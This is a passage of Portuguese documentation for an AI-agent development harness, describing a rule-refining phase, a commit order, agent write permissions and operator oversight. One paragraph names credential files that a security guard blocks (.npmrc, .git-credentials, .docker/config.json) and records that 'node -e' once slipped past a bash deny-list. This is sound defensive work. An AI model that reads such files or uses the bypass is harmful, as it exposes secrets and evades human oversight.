review. Raciocínio completo em `docs/harness/continual-harness.md` e `docs/harness/v1.3-context.md`.

### `/refine` — o que é

O **Refine phase** roda entre o Judge e o `awaiting_confirmation`. O `refiner` (pago, read-only por
permissão) lê a janela de findings, retorna **no máximo uma proposta por componente por run** e não
escreve nada. Ele **não tem voto** no veredito: o payload do Judge não contém output do Refine.

- `/refine` — roda a fase: janela de findings → contagens via `harness-findings.mjs --json` → refiner
  → proposta renderizada no `awaiting_confirmation`.
- `/refine --note "<o que corrigi à mão>"` — registra um `operator_note` (classe própria, peso
  `operator_note_weight`); a palavra do operador passa a barra de proposta sozinha — aritmética, não
  caso especial.
- Sem evidência nova (sem findings desde o último `refine-log.md`), **não roda**: "no new evidence".
  Ausência é gap a nomear, nunca run limpo.

### O fluxo one-stop

```
gate → trailer (incl. Adherence:) → CODE COMMIT → Judge → Refine → awaiting_confirmation
  → confirmo → prosa como COMMIT SEPARADO do rulebook → próxima run injeta a regra no prompt da lane
```

**A prosa entra depois do commit de código, e essa ordem é estrutural.** `agent-os/standards/`,
`docs/review.md`, `learned-rules.json` e `refine-log.md` estão dentro do `sourceHash`; escrever prosa
antes do trailer estala o report e o `harness-ship-evidence` recusa — aprender com sucesso bloquearia
o ship. **Não "corrija" isso alargando `GATE_ARTIFACTS`**: tirar o rulebook do hash remove a única
detecção sobre ele e reproduz o TOCTOU do `**/auth/**` no próprio rulebook.

### Divisão de autoridade de escrita

Dados são escritos; prosa é proposta. Nenhum agente ganha permissão de escrita:

| O quê | Quem produz | Quem escreve | Gate |
|---|---|---|---|
| findings tipados | reviewers (`edit: deny`, **`bash: deny`**) | scheduler, write-once por label | nenhum — dado medido |
| contagens, linhas de aderência | `harness-findings.mjs` | scheduler | nenhum — determinístico |
| nota do operador | operador, via `/refine --note` | scheduler | nenhum — palavras do próprio operador |
| proposta de regra | `refiner` (tudo `deny`) | ninguém | — |
| refutação | `rule-verifier` (mesmo lockdown; dispatch distinto) | ninguém | — |
| regra **prose + observe** | — | scheduler, se o verifier não refutar, em commit separado | verifier (auto); veto do operador na leitura `high_risk_path` da próxima run |
| regra **blocking / high_risk_path** | — | scheduler, após confirmação, em commit separado | operador, vendo o TEXTO LITERAL |
| promoção de enforcement | — | scheduler, após confirmação | operador + um teste que falha antes e passa depois |
| números governantes | — | operador, em `quality-thresholds.json` | entrada datada em `quality-decisions.md` |
| qualquer coisa em `~/.config/opencode/` | — | operador, à mão | sempre |

`code-reviewer` foi para `bash: deny` (a deny-list enumerada deixava passar `node -e`), e o `refiner`
nega `external_directory` e `webfetch` explicitamente — o padrão global do plugin para o primeiro é
`ask`, e um agente cujo output vira prosa commitada e transmitida a todas as lanes não deve ler fora
do repo. Em 2026-08-12 (SEC-R4) o princípio foi generalizado: todo agente read-only de
review/advisory/recon nega `external_directory`; `architecture-reviewer` ficou restrito ao skill
`improve-codebase-architecture`; `security-analyst` perdeu `webfetch` (revisão defensiva local, sem
egress geral); e o security guard passou a bloquear também `.npmrc`/`_npmrc`/`npmrc`,
`.config/gh/hosts.yml`, `.docker/config.json` e `.git-credentials`. `task: deny` no refiner é o que
impede ele delegar uma escrita a um subagente com escrita.

### A cadência honesta

| Ação | Frequência |
|---|---|
| aprovar/recusar proposta (texto literal renderizado) | por run que produza uma, máx. 1 por componente |
| resolver conflito entre candidato e regra ativa | quando houver |
| confirmar aposentadoria (janela de citação / cap por target) | quando disparar |
| **autorar o lint/test da promoção de enforcement** | por regra promovida — o único jeito de `enforced_fraction` subir |
| setar thresholds do estágio 2 a partir de baselines, com razão datada | uma vez no estágio 2, depois por mudança |
| `/refine --note` depois de correção manual | quando acontecer |
| promover regra aos templates globais | raro; precisa de três projetos |

A linha do meio é a que o primeiro rascunho escondeu.

### O que o loop NÃO vê

Adesão conta **violações detectadas**, não reais — um reviewer degradado que acha menos findings lê
como progresso. Classificação continua julgada por modelo (o script valida o pointer e faz a
aritmética; o rótulo é do reviewer). A primeira ocorrência de um erro não chega a ninguém (barra
ponderada de propósito). A regra **permanentemente-prosa** é resultado legítimo, não backlog — e fica
**estruturalmente fora** do denominador de `enforced_fraction` (o adapter filtra as regras
`prose_permanent`). O loop **para se o operador parar de aprovar** (as regras
que podem bloquear), e **intervenção mid-run não é entregue**: o que existe é a halt list do run
autônomo, `cancel_task` por lane e o fallback serial; `Ctrl+C` não mata filhos em background. Nada de
**live acceptance** rodou ainda — a tabela C do spec (injeção chegando na lane, findings completos,
permissões valendo na prática, números de liveness existindo) é trabalho de modelo e está pendente.

Detalhes, invariantes 16–24 e o histórico das duas correções de score:
`docs/harness/continual-harness.md` e `docs/harness/v1.3-context.md`.

---

## Comandos Rápidos

```powershell
# Fluxo global recomendado em qualquer projeto com harness
/harness-session-start
/prevc nome-da-feature-ou-prompt
/harness-clean-handoff

# Iniciar/verificar baseline
.\init.ps1

# Auditar estado do harness
python -c "import json; d=json.load(open('feature_list.json')); [print(f'{f[\"id\"]}: {f[\"status\"]} — {f[\"title\"]}') for f in d['features']]"

# Listar skills instalados
Get-ChildItem -Directory -Path ".opencode\skills\harness-*" | ForEach-Object { Write-Host $_.Name }

# Fresh-session test (simular agente novo)
# Responda só com arquivos, sem memória de chat:
# 1. O que esse repo faz?     → AGENTS.md
# 2. Como verifico?            → init.ps1
# 3. O que está inacabado?     → STATE.md + feature_list.json
# 4. Qual a próxima task?      → STATE.md Next Best Action
```

---

## Referências

- **Curso original:** `learn-harness-engineering/` (templates, scripts, projetos)
- **Conhecimento compilado:** `zharnessengineering/` (14 arquivos, todos ≤200 linhas)
- **Roteamento:** `zharnessengineering/index.md` (por tópico e failure mode)
- **Plano de execução:** `agent-os/specs/2026-06-10-1148-harness-project-gaps/plan.md`
- **Skills instalados:** `.opencode/skills/harness-*/SKILL.md`

---

> **Princípio fundamental:** O repositório é o sistema de registro. Nenhuma informação de estado deve viver apenas na memória do chat. Se uma sessão nova não consegue responder "o que está acontecendo" lendo só os arquivos, o harness está incompleto.
